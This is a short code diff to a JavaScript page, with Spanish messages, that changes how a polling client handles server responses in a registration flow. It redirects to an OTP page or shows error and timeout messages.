@@ -70,26 +70,22 @@
 
       // Iniciar polling
       const poller = new PollingClient({
-        apiUrl: 'http://localhost:3000/api',
         pollingInterval: 2000,
         onSuccess: (data) => {
           loader.hide();
 
-          if (data.response === 'RegistroOtp' || data.response.includes('RegistroOtp')) {
-            // Redirigir a OTP
-            setTimeout(() => {
-              window.location.href = 'registrationOTP_clean.html';
-            }, 500);
+          if (data.response.includes('RegistroOtp')) {
+            window.location.href = 'registrationOTP_clean.html';
+          } else if (data.response.includes('ERROR') || data.response.includes('Error')) {
+            modalError.show('Los datos ingresados son incorrectos. Intenta nuevamente.');
           }
         },
         onError: (error) => {
           loader.hide();
-
-          if (error.type === 'error' || error.response === 'ERROR' || error.response?.includes('ERROR')) {
-            // Mostrar modal de error
-            modalError.show('Los datos ingresados son incorrectos. Intenta nuevamente.');
-          } else if (error.type === 'timeout') {
+          if (error.type === 'timeout') {
             modalError.show('Tiempo de espera agotado. Intenta nuevamente.');
+          } else {
+            modalError.show('Error de conexión. Intenta nuevamente.');
           }
         },
       });
